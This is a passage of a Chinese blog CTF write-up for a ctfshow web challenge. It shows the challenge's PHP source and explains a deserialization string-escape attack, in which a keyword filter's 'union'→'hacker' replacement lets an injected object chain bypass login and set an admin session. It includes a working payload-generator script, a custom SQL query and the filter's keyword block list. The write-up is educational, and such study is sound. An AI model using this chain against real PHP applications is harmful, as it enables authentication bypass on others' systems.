dbCtrl();</span><br><span class="line">        $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);</span><br><span class="line">        if($this-&gt;id)&#123;</span><br><span class="line">        $_SESSION[&#x27;id&#x27;]=$this-&gt;id;  </span><br><span class="line">        $_SESSION[&#x27;login&#x27;]=1;</span><br><span class="line">        echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];</span><br><span class="line">        echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];</span><br><span class="line">        echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">        return $this-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    public function update()&#123;</span><br><span class="line">        $Info=unserialize($this-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);</span><br><span class="line">        //这个功能还没有写完 先占坑</span><br><span class="line">    &#125;</span><br><span class="line">    public function getNewInfo()&#123;</span><br><span class="line">        $age=$_POST[&#x27;age&#x27;];</span><br><span class="line">        $nickname=$_POST[&#x27;nickname&#x27;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        return file_get_contents($this-&gt;nickname);//危</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __construct($newInfo,$sql)&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;noob123&quot;;</span><br><span class="line">    public $dbpass=&quot;noob123&quot;;</span><br><span class="line">    public $database=&quot;noob123&quot;;</span><br><span class="line">    public $name;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$_POST[&#x27;username&#x27;];</span><br><span class="line">        $this-&gt;password=$_POST[&#x27;password&#x27;];</span><br><span class="line">        $this-&gt;token=$_SESSION[&#x27;token&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);</span><br><span class="line">        if ($this-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=$this-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">            return $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$idResult) &#123;</span><br><span class="line">            echo(&#x27;用户不存在!&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (md5($this-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            echo(&#x27;密码错误！&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#x27;token&#x27;]=$this-&gt;name;</span><br><span class="line">        return $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    public function update($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        //还没来得及写</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题涉及到了反序列化字符串逃逸。</p>
+<blockquote>
+<p><strong>PHP在进行反序列化的时候，只要前面的字符串符合反序列化的规则并能成功反序列化，那么将忽略后面多余的字符串</strong></p>
+</blockquote>
+<p>把<a href="http://www.zip扒下来，看得到只有`$_SESSION[&#39;login&#39;]===1`的时候才能弹出flag">www.zip扒下来，看得到只有`$_SESSION[&#39;login&#39;]===1`的时候才能弹出flag</a></p>
+<p>但是只有User::login()中才会对<code>$_SESSION[&#39;login&#39;]</code>进行赋值</p>
+<p>而赋值的条件得是token&#x3D;admin或者password&#x3D;数据库中password</p>
+<p>通过分析可知，User::login()其实就是写死了dbCtl::login()的查询语句，但是我们可以通过链子自己构造sql语句</p>
+<p>UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__Call-&gt;dbCtrl::login()</p>
+<p>这样如果第一次打通了，会触发<code>$_SESSION[&#39;token&#39;]=&quot;admin&quot;</code></p>
+<p>第二次再次登陆的时候，会直接判断dbCtrl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">    return $idResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以绕过密码的验证</p>
+<p>唯一的问题就是Info在构造的时候并不会构造$CtrlCase，导致无法进__call函数</p>
+<p>但是safe函数可以帮助绕过该限制（字符串逃逸漏洞）</p>
+<p>尝试传<code>age=1&amp;nickname=2</code></p>
+<p>传出的反序列化字符串为</p>
+<p><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code></p>
+<p>说明可控的只有age和nickname两个字段，最后的CtrlCase无法传入。但是由于safe的函数的出现，使得逃逸成为了可能</p>
+<p>当传入<code>age=1&amp;nickname=union</code>时</p>
+<p>传出的反序列化字符串变成了</p>
+<p><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:5:&quot;hacker&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code></p>
+<p>这样<code>s:8:&quot;nickname&quot;;s:5:&quot;hacker&quot;</code>就出错了，因为其中的s:5仅与传入的nickname的值的长度有关，而hacker是6位。这是因为safe函数会把一些单词替换</p>
+<p>那就可以自行构造一个序列化字符串进去，强行把后面的CtrlCase构造出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User&#123;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;nickname = new Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info&#123;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;CtrlCase = new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UpdateHelper&#123;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;sql = new User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl&#123;</span><br><span class="line">    public $name = &quot;admin&quot;;</span><br><span class="line">    public $password = &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$u = new UpdateHelper();</span><br><span class="line">$len = strlen(&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;.serialize($u).&#x27;&#125;&#x27;);</span><br><span class="line">$payload = str_repeat(&#x27;union&#x27;, $len).&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;.serialize($u).&#x27;&#125;&#x27;;</span><br><span class="line">echo $payload;</span><br></pre></td></tr></table></figure>
+
+<p>这样就构造出了payload，把payload作为nickname传入</p>
+<p>由于safe会把union修改为hacker（字符数+1），只要我们传入一定长度的union，就可以让<code>s:8:&quot;nickname&quot;;s:1920:</code>其中的s:1920全部变成hacker，从而使后面我们自行构造的CtrlCase逃出</p>
+<p>当我们传入的sql语句<code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code>不管username是什么，始终返回1,c4ca4238a0b923820dcc509a6f75849b</p>
+<p>而在传入payload的时候就指定<code>public $password = &#39;1&#39;</code>，就可以通过<code>if (md5($this-&gt;password)!==$passwordResult)</code>这条语句成功赋值session</p>
+<p>在最后添加一个}来提前结束反序列化，由于反序列化的特性，成功后将忽略后面多余的字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202310152238698.png" alt="image-20231015223831637"></p>
+<p>打进去之后我们的$_SESSION[‘token’]&#x3D;admin，再次访问login就能通过验证弹出flag</p>
+<h2 id="Fishman"><a href="#Fishman" class="headerlink" title="Fishman"></a>Fishman</h2> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/20/ctfshow%E7%BB%83%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/09/20/sql_quine%E6%B3%A8%E5%85%A5%E8%AE%B0%E5%BD%95/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            sql_quine注入记录
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/09/19/ctfshow_%E8%90%8C%E6%96%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">ctfshow_萌新</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2023
+        <i class="ri-heart-fill heart_icon"></i> b1xcy
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/side.svg" alt="b1xcy&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
